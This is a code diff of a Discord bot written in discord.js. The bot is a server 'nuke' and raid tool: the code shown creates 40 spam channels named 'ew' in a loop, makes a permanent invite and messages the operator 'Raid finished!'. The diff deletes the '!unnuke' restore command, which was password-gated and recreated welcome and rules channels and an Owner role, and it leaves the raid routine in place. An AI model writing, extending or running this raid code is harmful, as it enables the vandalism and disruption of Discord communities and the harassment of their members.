@@ -55,7 +55,6 @@ client.on('messageCreate', async message => {
     );
 
     await message.reply({ embeds: [embed], components: [row] });
-    return;
   }
 
   if (content === '!servers') {
@@ -79,16 +78,9 @@ client.on('messageCreate', async message => {
     message.reply(text);
     return;
   }
-
-  if (content === '!unnuke') {
-    const embed = new EmbedBuilder().setColor('#00ff00').setTitle('🛠️ !UNNUKE').setDescription('Restores the nuked server.').setFooter({ text: 'Click below' });
-    const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`unnuke_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Success));
-    await message.reply({ embeds: [embed], components: [row] });
-    return;
-  }
 });
 
-// INTERACTIONS
+// FIXED INTERACTIONS
 client.on('interactionCreate', async interaction => {
   if (!interaction.customId) return;
 
@@ -141,7 +133,6 @@ client.on('interactionCreate', async interaction => {
         for (let i = 0; i < 40; i++) {
           await guild.channels.create({ name: 'ew', type: ChannelType.GuildText }).catch(() => {});
         }
-
         const invite = await ew.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
         if (invite) await user.send(`✅ Raid finished!\nInvite: https://discord.gg/${invite.code}`);
 
@@ -150,21 +141,6 @@ client.on('interactionCreate', async interaction => {
         console.error(err);
         await interaction.followUp({ content: '⚠️ Raid partially failed.', ephemeral: true });
       }
-    }
-
-    // === !unnuke Handler ===
-    if (interaction.customId.startsWith('unnuke_modal_')) {
-      const password = interaction.fields.getTextInputValue('password');
-      if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
-
-      await interaction.reply({ content: '🛠️ **Restoring the server...**', ephemeral: true });
-
-      // Restore channels and roles
-      await guild.channels.create({ name: 'welcome', type: ChannelType.GuildText });
-      await guild.channels.create({ name: 'rules', type: ChannelType.GuildText });
-      await guild.roles.create({ name: 'Owner', color: '#ffd700', permissions: [PermissionFlagsBits.Administrator] });
-
-      await interaction.followUp({ content: '✅ **Server restored successfully!**', ephemeral: true });
     }
   } catch (error) {
     console.error(error);
